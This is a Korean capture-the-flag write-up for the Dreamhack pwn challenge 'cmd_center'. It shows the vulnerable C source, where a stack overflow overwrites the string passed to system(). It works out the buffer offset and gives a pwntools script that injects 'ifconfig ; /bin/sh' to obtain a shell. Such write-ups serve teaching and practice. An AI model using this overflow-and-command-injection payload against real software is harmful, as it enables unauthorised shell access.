---
title: "[Dreamhack] cmd_center Write up"
author: d0razi
date: 2023-08-13 16:30
categories: [InfoSec, Pwn]
tags: [linux, Dreamhack]
toc: false
image: /assets/img/media/banner/dreamhack.jpg
---

# 분석

## 보호기법

![Untitled](/assets/img/media/post_img/dreamhack/cmd-center/Untitled.png)

## 소스코드

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void init() {
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
}

int main()
{

	char cmd_ip[256] = "ifconfig";
	int dummy;
	char center_name[24];

	init();

	printf("Center name: ");
	read(0, center_name, 100);

	if( !strncmp(cmd_ip, "ifconfig", 8)) {
		system(cmd_ip);
	}

	else {
		printf("Something is wrong!\n");
	}
	exit(0);
}
```

- center_name에 입력을 받는 부분에서 bof가 발생합니다.
- cmd_ip의 8글자가 `ipconfig` 면 cmd_ip가 인자로 system함수가 실행됩니다.

# 풀이

저는 리눅스 다중명령어인 **`;`** 을 사용했습니다. 

<aside>
💡 ; 의 기능
하나의 명령어 라인에서 여러개의 명령을 실행하게 해줍니다. 첫 명령어가 실패해도 두번째 명령어는 실행됩니다.

</aside>

**필요한 정보**

- center_name ↔ cmd_ip 오프셋

## center_name ↔ cmd_ip 오프셋

![Untitled](/assets/img/media/post_img/dreamhack/cmd-center/Untitled%201.png)

오프셋 = 0x130 - 0x110

# 익스플로잇

```python
from pwn import *

p = process("./cmd_center")
#p = remote("host3.dreamhack.games", 16526)
payload = b'A' * (0x130 - 0x110)
payload += b'ifconfig ; /bin/sh'

p.sendline(payload)
p.interactive()
```

![Untitled](/assets/img/media/post_img/dreamhack/cmd-center/Untitled%202.png)